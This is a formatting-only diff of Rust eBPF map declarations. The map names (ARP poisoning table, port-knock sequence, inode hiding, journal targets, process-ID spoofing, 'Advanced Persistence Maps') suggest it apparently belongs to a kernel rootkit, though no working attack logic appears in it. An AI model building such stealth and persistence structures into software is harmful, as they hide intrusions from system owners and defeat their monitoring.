@@ -198,8 +198,7 @@ pub(crate) static IPV6_EXT_QUEUE: HashMap<u32, [u8; 64]> = HashMap::with_max_ent
 pub(crate) static ARP_POISON_TABLE: HashMap<u32, [u8; 6]> = HashMap::with_max_entries(32, 0);
 
 #[map]
-pub(crate) static PORT_KNOCK_SEQ: HashMap<u32, PortKnockState> =
-    HashMap::with_max_entries(16, 0);
+pub(crate) static PORT_KNOCK_SEQ: HashMap<u32, PortKnockState> = HashMap::with_max_entries(16, 0);
 
 #[map]
 pub(crate) static PORT_KNOCK_CONFIG: aya_ebpf::maps::Array<PortKnockConfig> =
@@ -240,8 +239,7 @@ pub(crate) static SLACK_HIDE_INODES: HashMap<u64, SlackHideEntry> =
 pub(crate) static JOURNAL_TARGETS: HashMap<u64, u8> = HashMap::with_max_entries(16, 0);
 
 #[map]
-pub(crate) static PROC_SPOOF_PIDS: HashMap<u32, ProcSpoofEntry> =
-    HashMap::with_max_entries(64, 0);
+pub(crate) static PROC_SPOOF_PIDS: HashMap<u32, ProcSpoofEntry> = HashMap::with_max_entries(64, 0);
 
 // ──────────────────────────────────────────────
 // Advanced Persistence Maps
